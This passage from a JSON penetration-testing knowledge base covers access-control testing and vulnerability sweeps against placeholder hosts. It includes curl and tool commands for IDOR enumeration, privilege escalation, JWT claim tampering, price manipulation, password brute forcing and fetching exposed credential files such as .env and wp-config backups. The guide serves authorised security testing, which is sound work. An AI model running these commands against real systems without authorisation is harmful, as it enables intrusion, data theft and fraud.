**jwt_tool**: https://github.com/ticarpi/jwt_tool (JWT security testing)\n- **Hashcat**: https://hashcat.net/hashcat/ (JWT secret brute forcing)\n- **OWASP ZAP**: https://www.zaproxy.org/ (Automated authentication testing)\n\nFURTHER READING:\n- OWASP Testing Guide WSTG-AUTHN: https://owasp.org/www-project-web-security-testing-guide/\n- NIST SP 800-63B: Digital Identity Guidelines (Authentication)\n- OWASP Authentication Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html\n- JWT Best Practices: https://tools.ietf.org/html/rfc8725\n- PCI DSS Requirement 8: https://www.pcisecuritystandards.org/",
      "tags": [
        "authentication",
        "session-management",
        "password-policy",
        "mfa",
        "jwt",
        "oauth",
        "saml"
      ],
      "related_tools": [
        "hunter-io",
        "playbook_credential_spraying_brute_force",
        "burp-api-scanner",
        "sso-oauth-oidc-misconfig-playbook",
        "playbook_multi_stage_credential_harvesting"
      ]
    },
    {
      "id": "access_control_testing",
      "title": "Access control testing",
      "content": "OBJECTIVE: Verify that authorization controls prevent users from accessing resources beyond their permissions through horizontal and vertical privilege escalation testing.\n\nACADEMIC BACKGROUND:\nThis step addresses OWASP Top 10:2021 A01 (Broken Access Control) and OWASP Testing Guide WSTG-ATHZ series (Authorization Testing). MITRE ATT&CK T1069 (Permission Groups Discovery) and T1548 (Abuse Elevation Control Mechanism) detail privilege escalation techniques. NIST SP 800-53 AC-3 mandates access enforcement controls. CWE-639 (Authorization Bypass) is a critical weakness class.\n\nSTEP-BY-STEP PROCESS:\n\n1. Role and Permission Mapping:\n```bash\n# Document user roles and permissions:\n# - Guest/Anonymous\n# - Authenticated User\n# - Power User/Manager\n# - Administrator/Root\n\n# Create test accounts for each role:\n# user1@test.com (basic user)\n# manager1@test.com (manager)\n# admin@test.com (administrator)\n\n# Map accessible endpoints per role:\ncurl -H \"Authorization: Bearer user_token\" https://api.target.com/users\ncurl -H \"Authorization: Bearer admin_token\" https://api.target.com/admin/users\n\n# Document access control model:\n# - Role-Based Access Control (RBAC)\n# - Attribute-Based Access Control (ABAC)\n# - Discretionary Access Control (DAC)\n# - Mandatory Access Control (MAC)\n```\n\n2. Insecure Direct Object Reference (IDOR) Testing:\n```bash\n# Horizontal IDOR (access other users' data):\n# User A (ID=100) authenticated:\ncurl -H \"Cookie: session=userA\" https://target.com/api/profile?user_id=100\ncurl -H \"Cookie: session=userA\" https://target.com/api/profile?user_id=101  # Try User B's ID\n\n# Test different parameter formats:\n/api/user/100\n/api/user?id=100\n/api/user/profile/100\n/user/MTAw  # Base64 encoded 100\n/user/0x64  # Hexadecimal 100\n\n# Mass enumeration:\nfor i in {1..1000}; do\n    curl -s -H \"Cookie: session=userA\" \"https://target.com/api/invoice?id=$i\" | grep -i \"success\"\ndone\n\n# UUID IDOR testing:\n# Even with UUIDs, test if authorization is checked:\ncurl -H \"Cookie: session=userA\" https://target.com/api/document/a1b2c3d4-e5f6-7g8h-9i0j-k1l2m3n4o5p6\n\n# Automated IDOR testing with Burp Autorize extension:\n# https://github.com/PortSwigger/autorize\n```\n\n3. Vertical Privilege Escalation Testing:\n```bash\n# Test administrative functionality as regular user:\n# Capture admin requests in Burp Suite, replay with user session\n\n# Common admin endpoints to test:\ncurl -H \"Cookie: session=regular_user\" https://target.com/admin\ncurl -H \"Cookie: session=regular_user\" https://target.com/admin/users\ncurl -H \"Cookie: session=regular_user\" -X POST https://target.com/admin/users -d '{\"role\":\"admin\"}'\n\n# Test hidden admin parameters:\ncurl -H \"Cookie: session=user\" https://target.com/profile -d \"username=test&role=admin\"\ncurl -H \"Cookie: session=user\" https://target.com/settings -d \"is_admin=1\"\n\n# HTTP method override:\ncurl -X POST -H \"X-HTTP-Method-Override: PUT\" https://target.com/api/user/100\ncurl -X GET -H \"X-HTTP-Method-Override: DELETE\" https://target.com/api/user/100\n\n# Parameter pollution:\n/api/user?id=100&id=1&role=admin\n```\n\n4. Path Traversal and Forced Browsing:\n```bash\n# Test access to admin paths:\n/admin/\n/administrator/\n/moderator/\n/manage/\n/control-panel/\n.env\n/backup/\n/config/\n\n# Test with wordlists:\ngobuster dir -u https://target.com/ -w /usr/share/wordlists/dirb/common.txt -c \"SESSIONID=user_session\" -t 50\n\n# Test different HTTP methods:\ncurl -X GET https://target.com/admin  # 403 Forbidden\ncurl -X POST https://target.com/admin  # May allow access\ncurl -X OPTIONS https://target.com/admin\ncurl -X TRACE https://target.com/admin\n\n# Case sensitivity bypass:\n/Admin\n/ADMIN\n/aDmIn\n```\n\n5. API Authorization Testing:\n```bash\n# Test API endpoints without authentication:\ncurl https://api.target.com/users\ncurl https://api.target.com/admin/settings\n\n# Test with invalid/expired tokens:\ncurl -H \"Authorization: Bearer expired_token\" https://api.target.com/users\ncurl -H \"Authorization: Bearer invalid\" https://api.target.com/users\n\n# Test GraphQL authorization:\ncurl -X POST https://api.target.com/graphql \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\"query\": \"{users{id email password_hash}}\"}'\n\n# REST API IDOR:\ncurl -H \"Authorization: Bearer userA_token\" https://api.target.com/api/v1/invoices/100\ncurl -H \"Authorization: Bearer userA_token\" https://api.target.com/api/v1/invoices/101  # Different user\n\n# Mass assignment vulnerabilities:\ncurl -X POST https://api.target.com/api/users -H \"Authorization: Bearer user_token\" \\\n  -d '{\"username\":\"test\",\"email\":\"test@test.com\",\"role\":\"admin\"}'\n```\n\n6. JWT Authorization Bypass:\n```bash\n# Modify JWT claims without re-signing:\n# Original: {\"sub\":\"user@test.com\",\"role\":\"user\"}\n# Modified: {\"sub\":\"user@test.com\",\"role\":\"admin\"}\n\n# Use jwt_tool to test authorization:\npython3 jwt_tool.py <JWT> -T\n\n# Test JWT with modified user ID:\n# Decode, change \"user_id\": 100 → 101, re-encode without signature\n\n# Test privilege escalation in JWT:\n# {\"admin\": false} → {\"admin\": true}\n# {\"permissions\": [\"read\"]} → {\"permissions\": [\"read\",\"write\",\"delete\"]}\n```\n\n7. Business Logic Access Control Flaws:\n```bash\n# Test workflow bypasses:\n# Step 1: Add item to cart\n# Step 2: Proceed to checkout\n# Step 3: Skip directly to order confirmation without payment\n\n# Multi-step process bypass:\n# Registration → Email verification → Profile complete\n# Try accessing profile completion without email verification\n\n# State manipulation:\n# Order status: pending → shipped (without payment)\n# Account status: disabled → enabled\n# Trial period: expired → active\n\n# Price manipulation:\ncurl -X POST https://target.com/checkout \\\n  -d '{\"item_id\":123,\"quantity\":1,\"price\":0.01}'  # Original price $100\n\n# Discount code stacking:\n# Apply multiple discount codes beyond intended limits\n```\n\n8. File Upload Authorization:\n```bash\n# Test file upload access control:\n# Upload as User A to User B's directory:\ncurl -X POST https://target.com/upload \\\n  -F \"file=@test.txt\" \\\n  -F \"user_id=101\" \\\\  # Different user's ID\n  -H \"Cookie: session=userA\"\n\n# Test file download authorization:\ncurl https://target.com/download?file=../../other_user/private.pdf\n\n# Test file deletion authorization:\ncurl -X DELETE https://target.com/api/files/12345 -H \"Cookie: session=userA\"\n# File belongs to User B\n```\n\n9. Function-Level Access Control:\n```bash\n# Test privileged functions with low-privilege account:\n# User management functions:\ncurl -X POST https://target.com/api/users/delete -d \"user_id=100\" -H \"Cookie: session=user\"\ncurl -X POST https://target.com/api/users/promote -d \"user_id=100&role=admin\" -H \"Cookie: session=user\"\n\n# System configuration functions:\ncurl -X PUT https://target.com/api/settings -d \"maintenance_mode=true\" -H \"Cookie: session=user\"\n\n# Reporting functions:\ncurl https://target.com/api/reports/all_users -H \"Cookie: session=user\"\ncurl https://target.com/api/export/database -H \"Cookie: session=user\"\n\n# Financial functions:\ncurl -X POST https://target.com/api/transactions/refund -d \"transaction_id=12345\" -H \"Cookie: session=user\"\n```\n\n10. Test Access Control with Burp Suite Autorize:\n```bash\n# Install Autorize extension:\n# 1. Load extension in Burp Suite Extender\n# 2. Configure low-privilege user session\n# 3. Browse as high-privilege user\n# 4. Autorize replays requests with low-privilege session\n# 5. Compares responses to detect authorization bypasses\n\n# GitHub: https://github.com/PortSwigger/autorize\n\n# Alternative: Use OWASP ZAP Access Control Testing add-on\n```\n\nWHAT TO LOOK FOR:\n- **Horizontal IDOR**: User A can access User B's data by changing ID parameters\n- **Vertical Privilege Escalation**: Regular user can access admin functions\n- **Missing Function-Level Controls**: Admin endpoints accessible without authorization checks\n- **Path Traversal**: ../../../ sequences bypass access controls\n- **JWT Authorization Bypass**: Modified JWT claims accepted without signature validation\n- **API Endpoint Exposure**: Unauthenticated or unauthorized API access\n- **Mass Assignment**: Setting unauthorized fields (role=admin) in API requests\n- **Business Logic Bypass**: Skipping payment steps, manipulating workflow states\n- **File Access Violations**: Reading/writing/deleting other users' files\n\nSECURITY IMPLICATIONS:\n- **Data Breach**: IDOR vulnerabilities expose all user data through simple ID enumeration\n- **Account Takeover**: Privilege escalation enables attackers to gain administrative access\n- **Financial Fraud**: Price manipulation and payment bypass lead to revenue loss\n- **Regulatory Non-Compliance**: Data access violations breach GDPR Article 32, HIPAA §164.312, SOC 2 CC6.1\n- **Reputation Damage**: Public disclosure of access control failures erodes customer trust\n- **Insider Threat**: Weak access controls enable malicious insiders to access sensitive data\n\nCOMMON PITFALLS:\n- **UI-Only Restrictions**: Frontend hides admin buttons but backend allows access\n- **API vs Web Different Controls**: Web interface enforces authorization but API does not\n- **Client-Side Authorization**: JavaScript checks can be bypassed by direct API calls\n- **Sequential IDs vs UUIDs**: UUIDs make enumeration harder but don't replace authorization checks\n- **Partial Authorization**: Application checks authentication but not resource ownership\n- **Cached Responses**: Authorization failures may still return cached data\n- **Middleware Bypass**: Direct file access bypasses application authorization layer\n\nTOOLS REFERENCE:\n- **Burp Suite Autorize**: https://github.com/PortSwigger/autorize (Automated access control testing)\n- **OWASP ZAP Access Control**: https://www.zaproxy.org/ (Access control scanning)\n- **jwt_tool**: https://github.com/ticarpi/jwt_tool (JWT manipulation and testing)\n- **Postman**: https://www.postman.com/ (API authorization testing)\n- **Insomnia**: https://insomnia.rest/ (REST API client for access control tests)\n\nFURTHER READING:\n- OWASP Testing Guide WSTG-ATHZ: https://owasp.org/www-project-web-security-testing-guide/\n- OWASP Top 10 A01 Broken Access Control: https://owasp.org/Top10/A01_2021-Broken_Access_Control/\n- OWASP Authorization Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/Authorization_Cheat_Sheet.html\n- PortSwigger Access Control: https://portswigger.net/web-security/access-control",
      "tags": [
        "access-control",
        "authorization",
        "idor",
        "privilege-escalation",
        "rbac",
        "api-security"
      ],
      "related_tools": [
        "hunter-io",
        "burp-api-scanner",
        "ffuf-api",
        "graphql-testing",
        "owasp-zap"
      ]
    },
    {
      "id": "common_vulnerability_sweeps",
      "title": "Common vulnerability sweeps",
      "content": "OBJECTIVE: Perform comprehensive automated and manual vulnerability scanning across all discovered assets using industry-standard tools and methodologies.\n\nACADEMIC BACKGROUND:\nThis step implements NIST SP 800-115 Section 7.3 (Vulnerability Scanning) and aligns with PTES Technical Guidelines Vulnerability Analysis phase. OWASP Top 10:2021 provides a vulnerability prioritization framework. MITRE ATT&CK Initial Access tactics (T1190 - Exploit Public-Facing Application) emphasize identifying exploitable vulnerabilities. CIS Controls 7.1-7.5 mandate continuous vulnerability assessment.\n\nSTEP-BY-STEP PROCESS:\n\n1. Network Vulnerability Scanning:\n```bash\n# OpenVAS comprehensive scan:\n# Install: sudo apt install openvas\n# Setup: sudo gvm-setup\n# Start: sudo gvm-start\n# Web UI: https://localhost:9392\n\n# Nessus Professional (commercial):\n# Download from https://www.tenable.com/downloads/nessus\n# Install and configure scan targets\n# Run \"Basic Network Scan\" or \"Web Application Tests\"\n\n# Nmap vulnerability scripts (NSE):\nnmap --script vuln target.com\nnmap --script \"vuln and safe\" target.com\nnmap --script vulners target.com  # CVE detection\n\n# Specific vulnerability checks:\nnmap --script smb-vuln-ms17-010 192.168.1.0/24  # EternalBlue\nnmap --script ssl-heartbleed target.com\nnmap --script http-shellshock --script-args uri=/cgi-bin/test.sh target.com\n```\n\n2. Web Application Scanning:\n```bash\n# Nuclei template-based scanning:\nnuclei -u https://target.com -t /root/nuclei-templates/\nnuclei -l urls.txt -t cves/ -t vulnerabilities/ -o results.txt\nnuclei -u https://target.com -tags cve,owasp,config -severity critical,high\n\n# Update templates:\nnuclei -update-templates\n\n# OWASP ZAP active scan:\nzap-cli quick-scan --self-contained --start-options \"-config api.disablekey=true\" https://target.com\nzap-cli active-scan https://target.com\nzap-cli report -o zap_report.html -f html\n\n# Nikto web server scanner:\nnikto -h https://target.com -output nikto_scan.html -Format html\nnikto -h https://target.com -ssl -port 443\n\n# WPScan for WordPress:\nwpscan --url https://target.com --enumerate vp,vt,u --api-token <token>\nwpscan --url https://target.com --passwords /usr/share/wordlists/rockyou.txt\n```\n\n3. SQL Injection Automated Testing:\n```bash\n# SQLMap comprehensive testing:\nsqlmap -u \"https://target.com/page?id=1\" --batch --crawl=3\nsqlmap -u \"https://target.com/page?id=1\" --forms --batch --dbs\nsqlmap -u \"https://target.com/page?id=1\" --level=5 --risk=3 --threads=10\n\n# Test all parameters from Burp Suite:\nsqlmap -r request.txt --batch\n\n# Blind SQL injection with time delays:\nsqlmap -u \"https://target.com/page?id=1\" --technique=T --time-sec=5\n```\n\n4. SSL/TLS Vulnerability Assessment:\n```bash\n# testssl.sh comprehensive TLS testing:\ntestssl.sh https://target.com --html --outfile tls_report.html\n\n# Specific vulnerability checks:\ntestssl.sh --heartbleed https://target.com\ntestssl.sh --poodle https://target.com\ntestssl.sh --sweet32 https://target.com\ntestssl.sh --robot https://target.com\n\n# SSLScan:\nsslscan --show-certificate --no-failed target.com:443\n\n# Nmap SSL scripts:\nnmap --script ssl-enum-ciphers -p 443 target.com\nnmap --script ssl-cert,ssl-known-key -p 443 target.com\n```\n\n5. Content Management System (CMS) Scanning:\n```bash\n# WordPress - WPScan:\nwpscan --url https://target.com --enumerate vp,vt,u --plugins-detection aggressive\n\n# Joomla - JoomScan:\ngit clone https://github.com/OWASP/joomscan.git\ncd joomscan\nperl joomscan.pl -u https://target.com\n\n# Drupal - Droopescan:\npip3 install droopescan\ndroopescan scan drupal -u https://target.com\n\n# Generic CMS detection:\nwhatweb https://target.com -v\n```\n\n6. Directory and File Enumeration:\n```bash\n# Gobuster directory brute-forcing:\ngobuster dir -u https://target.com/ -w /usr/share/wordlists/dirb/big.txt -t 50 -x php,html,txt,bak\n\n# Feroxbuster recursive scanning:\nferoxbuster -u https://target.com/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html -t 50 --depth 4\n\n# ffuf for fuzzing:\nffuf -w /usr/share/wordlists/dirb/common.txt -u https://target.com/FUZZ\n\n# Dirsearch:\ngit clone https://github.com/maurosoria/dirsearch.git\ncd dirsearch\npython3 dirsearch.py -u https://target.com -e php,html,js,txt\n```\n\n7. Security Misconfiguration Detection:\n```bash\n# Nuclei misconfigurations:\nnuclei -u https://target.com -t misconfigurations/ -t exposures/\n\n# Common misconfigurations to check:\n# - Directory listing enabled\ncurl https://target.com/uploads/ | grep \"Index of\"\n\n# - Server information disclosure\ncurl -I https://target.com | grep -i \"Server:\\|X-Powered-By\"\n\n# - CORS misconfiguration\ncurl -H \"Origin: https://evil.com\" -I https://target.com/api | grep -i \"access-control\"\n\n# - Security headers missing:\ncurl -I https://target.com | grep -i \"strict-transport\\|content-security\\|x-frame\"\n\n# securityheaders.com check:\ncurl https://securityheaders.com/?q=https://target.com&followRedirects=on\n```\n\n8. Sensitive Data Exposure Scanning:\n```bash\n# Search for exposed credentials:\nnuclei -u https://target.com -t exposures/configs/ -t exposures/tokens/\n\n# Common exposed files:\ncurl https://target.com/.git/config\ncurl https://target.com/.env\ncurl https://target.com/config.php.bak\ncurl https://target.com/.DS_Store\ncurl https://target.com/wp-config.php.bak\ncurl https://target.com/.htaccess\ncurl https://target.com/robots.txt\n\n# GitDorker for exposed repositories:\ngit clone https://github.com/obheda12/GitDorker.git\npython3 GitDorker.py -tf Dorks/alldorksv3 -q target.com -d Dorks/\n\n# TruffleHog for secrets in Git repos:\ntrufflehog --regex --entropy=False https://github.com/target/repo\n```\n\n9. API Security Testing:\n```bash\n# API endpoint enumeration:\nferoxbuster -u https://api.target.com/ -w /usr/share/wordlists/api-routes.txt\n\n# GraphQL introspection:\ncurl https://target.com/graphql -X POST -H \"Content-Type: application/json\" \\\n  -d '{\"query\": \"{__schema{types{name,fields{name}}}}\"}' | jq\n\n# REST API fuzzing:\nffuf -w /usr/share/wordlists/api-endpoints.txt \\\n  -u https://api.target.com/v1/FUZZ \\\n  -H \"Authorization: Bearer token\" \\\n  -mc 200,201,204,301,302,307,401,403\n\n# API rate limiting test:\nfor i in {1..1000}; do curl https://api.target.com/endpoint -H \"Authorization: Bearer token\"; done\n```\n\n10. Authenticated Vulnerability Scanning:\n```bash\n# Burp Suite authenticated scan:\n# 1. Configure browser proxy to Burp (127.0.0.1:8080)\n# 2. Login to application manually\n# 3. In Burp, right-click target → Scan\n# 4. Enable \"Application login\" in scan configuration\n\n# OWASP ZAP authenticated scan:\n# 1. Configure context with authentication\n# 2. Define user credentials\n# 3. Run active scan within context\n\n# Nuclei with authentication:\nnuclei -u https://target.com -H \"Cookie: SESSIONID=abc123\" -t vulnerabilities/\n\n# Custom script for authenticated testing:\ncookies=\"PHPSESSID=abc123; user_token=xyz789\"\nfor url in $(cat endpoints.txt); do\n    curl -s -H \"Cookie: $cookies\" \"$url\" | grep -i \"error\\|sql\\|exception\"\ndone\n```\n\nWHAT TO LOOK FOR:\n- **Critical CVEs (CVSS 9.0+)**: Remote code execution, authentication bypass, privilege escalation vulnerabilities\n- **Unpatched Services**: Outdated software versions with known public exploits (Apache 2.4.49, Log4Shell)\n- **OWASP Top 10 Vulnerabilities**: Injection, broken authentication, sensitive data exposure, XXE, broken access control\n- **Missing Security Headers**: Content-Security-Policy, X-Frame-Options, Strict-Transport-Security absent\n- **Default Credentials**: Unchanged vendor passwords on admin panels, databases, network devices\n- **Exposed Sensitive Files**: .git directories, .env files, database backups, configuration files accessible\n- **SSL/TLS Weaknesses**: Weak cipher suites, expired certificates, missing HSTS, vulnerable protocols\n- **Information Disclosure**: Verbose error messages, stack traces, server version banners\n- **Directory Listing Enabled**: File and folder contents exposed without index pages\n- **CORS Misconfiguration**: Overly permissive cross-origin policies allowing data theft\n\nSECURITY IMPLICATIONS:\n- **Mass Exploitation**: Automated tools enable rapid identification and exploitation across large attack surfaces\n- **Low-Hanging Fruit**: Default credentials and exposed files provide immediate access without advanced techniques\n- **Compliance Violations**: Unpatched vulnerabilities breach PCI DSS 6.2, HIPAA §164.308(a)(5), SOC 2 CC7.1\n- **Ransomware Entry**: Unpatched RCE vulnerabilities are primary vectors for ransomware deployment\n- **Data Breach**: Exposed configuration files contain database credentials enabling data exfiltration\n- **Supply Chain Risk**: Vulnerable third-party components (Log4j, Spring4Shell) affect multiple organizations\n\nCOMMON PITFALLS:\n- **False Positives**: Automated scanners report vulnerabilities that don't exist or aren't exploitable in context\n- **Scanner Limitations**: Tools miss business logic flaws, custom authentication, and zero-day vulnerabilities\n- **Rate Limiting/Blocking**: Aggressive scanning triggers WAF blocks, IP bans, account lockouts\n- **Environment Differences**: Scanning dev/staging may not reflect production security controls\n- **Authenticated Scanning Required**: Many vulnerabilities only exploitable post-authentication\n- **Resource Exhaustion**: Heavy scanning can degrade application performance or cause denial of service\n- **Legal Concerns**: Unauthorized scanning may violate Computer Fraud and Abuse Act (CFAA) or contracts\n\nTOOLS REFERENCE:\n- **Nuclei**: https://github.com/projectdiscovery/nuclei (Template-based vulnerability scanner)\n- **OpenVAS**: https://www.openvas.org/ (Open-source vulnerability scanner)\n- **Nessus**: https://www.tenable.com/products/nessus (Commercial vulnerability scanner)\n- **OWASP ZAP**: https://www.zaproxy.org/ (Web application security scanner)\n- **Nikto**: https://github.com/sullo/nikto (Web server scanner)\n- **Burp Suite**: https://portswigger.net/burp (Web application testing platform)\n- **testssl.sh**: https://github.com/drwetter/testssl.sh (SSL/TLS testing)\n- **WPScan**: https://wpscan.com/ (WordPress security scanner)\n\nFURTHER READING:\n- NIST SP 800-115: Technical Guide to Information Security Testing and Assessment\n- OWASP Testing Guide: https://owasp.org/www-project-web-security-testing-guide/\n- PTES Vulnerability Analysis: http://www.pentest-standard.org/index.php/Vulnerability_Analysis\n- SANS Vulnerability Scanning Best Practices: https://www.sans.org/reading-room/whitepapers/testing/\n- CIS Controls v8: https://www.cisecurity.org/controls/",
      "tags": [
        "vulnerability-scanning",
        "automated-testing",
        "nuclei",
        "openvas",
        "nessus",
        "zap",
        "nikto"
      ],
      "related_tools": [
        "burp-api-scanner",
        "comparison_sql_testing",
        "owasp-zap",
        "ffuf-api",
        "nuclei"
      ]
    }
  ]
}